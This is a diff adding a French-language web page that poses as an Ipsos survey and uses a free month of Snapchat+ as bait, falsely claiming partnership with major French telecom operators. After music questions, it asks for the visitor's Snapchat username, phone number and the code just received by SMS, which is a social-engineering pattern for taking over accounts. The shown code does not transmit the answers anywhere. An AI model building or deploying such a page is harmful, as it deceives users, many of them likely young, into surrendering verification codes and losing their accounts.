@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Sondage|Ipsos</title>
+<style>
+body { font-family: Arial; background:#f4f6f9; margin:0; font-size:20px; }
+
+/* HEADER AVEC LOGO */
+.header {
+    background:#003b7a;
+    padding:30px 30px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    position:relative;
+}
+.header img {
+    height:55px;
+    cursor:pointer;
+}
+
+/* TEXTE CENTRÉ */
+.header-text {
+    color:white;
+    font-size:28px;
+    font-weight:bold;
+}
+
+/* LOGO À GAUCHE */
+.header a {
+    position:absolute;
+    left:30px;
+}
+
+/* CONTENU CENTRAL */
+.box {
+    max-width:650px;
+    margin:70px auto;
+    background:white;
+    padding:50px;
+    border-radius:12px;
+    box-shadow:0 4px 12px rgba(0,0,0,0.1);
+}
+
+h2 { font-size:32px; margin-bottom:20px; }
+p { font-size:24px; margin-bottom:25px; }
+
+button {
+    padding:15px 28px;
+    background:#0078d4;
+    color:white;
+    border:0;
+    border-radius:8px;
+    cursor:pointer;
+    font-size:22px;
+}
+button:hover { background:#005fa3; }
+button:disabled {
+    background:#b0b0b0;
+    cursor:not-allowed;
+}
+
+.option { margin:10px 0; font-size:22px; }
+
+/* BARRE DE PROGRESSION */
+.progress-container {
+    width:100%;
+    height:10px;
+    background:#e0e0e0;
+    border-radius:5px;
+    margin-bottom:25px;
+    overflow:hidden;
+}
+
+.progress-bar {
+    height:100%;
+    width:0%;
+    background:#0078d4;
+    transition: width 0.3s ease;
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+    <a href="index.html" onclick="return confirmerRetour();">
+        <img src="logo.png" alt="Logo">
+    </a>
+
+    <div class="header-text"><h2>Ipsos sondage</h2></div>
+</div>
+
+<!-- ÉCRAN INTERMÉDIAIRE -->
+<div class="box" id="intro">
+    <h2>Sondage éphémère</h2>
+    <p>
+     Après avoir répondu à ce sondage, VOUS AUREZ SNAPCHAT + 🎁
+    </p>
+    <button onclick="demarrerSondage()">Commencer</button>
+</div>
+
+<!-- PAGE INTERMÉDIAIRE APRÈS QUESTION 3 -->
+<div class="box" id="intermediaire" style="display:none;">
+    <h2>Merci pour vos réponses à ce sondage express !</h2>
+    <p>Dans un instant, vous pourrez bénéficier de Snapchat+ pendant 1 mois !<br>
+    Nous avons besoin d'une dernière vérification afin de vous offrir l'abonnement.</p>
+    <button onclick="continuer()">Continuer</button>
+</div>
+
+<!-- SONDAGE -->
+<div class="box" id="sondage" style="display:none;">
+    <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <h2 id="titre"></h2>
+    <p id="question"></p>
+    <div id="reponses"></div>
+    <button onclick="suivant()">Suivant</button>
+</div>
+
+<script>
+function confirmerRetour() {
+    return confirm("Attention : si vous retournez à l'accueil, le sondage en cours sera perdu.");
+}
+
+/* INTRODUCTION → LANCER LE SONDAGE */
+function demarrerSondage() {
+    document.getElementById("intro").style.display = "none";
+    document.getElementById("sondage").style.display = "block";
+    afficherQuestion();
+    updateProgress();
+}
+
+let titre = "Sondage pour bénéficier de Snapchat +";
+
+let questions = [
+    { text: "Quel est ton artiste ou groupe préféré ?", type: "text", placeholder: "Exemple:Niska" },
+    { text: " Quel artiste écoute tu en ce moment sur Deezer?", type: "text", placeholder: "Exemple:Niska" },
+    { text: " Quel artiste aimerais tu découvrir davantage sur Deezer?", type: "text", placeholder: "Exemple:Jul" },
+    { text: "Quel est votre nom d'utilsateur snapchat?", type: "text", placeholder: "Entrez votre pseudo Snapchat" },
+    { text: "Quel est votre numéro de téléphone?", type: "text", placeholder: "XXXXXXXXXX" },
+    { text: "Entrez le code qui vous a été envoyé par SMS", type: "text", placeholder: "XXXX" }
+];
+
+let i = 0;
+
+/* AFFICHAGE DU TITRE */
+document.getElementById("titre").textContent = titre;
+
+/* FONCTION POUR AFFICHER UNE QUESTION */
+function afficherQuestion() {
+    let q = questions[i];
+    document.getElementById("question").textContent = q.text;
+
+    let zone = document.getElementById("reponses");
+    zone.innerHTML = "";
+
+    if (q.type === "text") {
+        zone.innerHTML = `<input id="champ" type="text" placeholder="${q.placeholder || ''}" oninput="verifierChamp()" style="width:100%; font-size:22px; padding:10px;">`;
+    }
+
+    document.querySelector("#sondage button").disabled = true;
+
+    updateProgress();
+}
+
+/* ACTIVER/DÉSACTIVER LE BOUTON */
+function verifierChamp() {
+    let input = document.getElementById("champ");
+    let bouton = document.querySelector("#sondage button");
+    bouton.disabled = !input.value.trim();
+}
+
+/* BARRE DE PROGRESSION */
+function updateProgress() {
+    let progress = ((i) / questions.length) * 100;
+    document.getElementById("progressBar").style.width = progress + "%";
+}
+
+/* PASSER A LA QUESTION SUIVANTE */
+function suivant() {
+    let q = questions[i];
+
+    if (q.type === "text") {
+        let input = document.querySelector("#reponses input");
+        if (!input.value.trim()) {
+            alert("Veuillez remplir ce champ avant de continuer.");
+            return;
+        }
+    }
+
+    if (q.text.includes("numéro")) {
+        let tel = document.querySelector("#reponses input").value.trim();
+        if (!/^[0-9]{10}$/.test(tel)) {
+            alert("Veuillez entrer un numéro de téléphone valide (10 chiffres).");
+            return;
+        }
+    }
+
+    i++;
+
+    // PAGE INTERMÉDIAIRE APRÈS LA 3ème QUESTION
+    if (i === 3) {
+        document.getElementById("sondage").style.display = "none";
+        document.getElementById("intermediaire").style.display = "block";
+        return;
+    }
+
+    if (i < questions.length) {
+        afficherQuestion();
+    } else {
+        document.querySelector("#sondage").innerHTML =
+        "<h2>Nous arrivons à la fin du sondage.<br><br>" +
+        "Un message vous sera envoyé dans les prochaines 24 heures pour vous informer " +
+        "si vous avez remporté Snapchat+.<br><br>" +
+        "À bientôt chez Ipsos !</h2>";
+    }
+}
+
+/* CONTINUER APRÈS LA PAGE INTERMÉDIAIRE */
+function continuer() {
+    document.getElementById("intermediaire").style.display = "none";
+    document.getElementById("sondage").style.display = "block";
+    afficherQuestion();
+}
+</script>
+
+<br><br><br><br>
+<br><h4><center>Snapchat + Ipsos sondage</center></h4>
+<br> <h5><center>En partenariat avec Bouygues Telecom,Orange et SFR</center></h5>
+
+</body>
+</html>
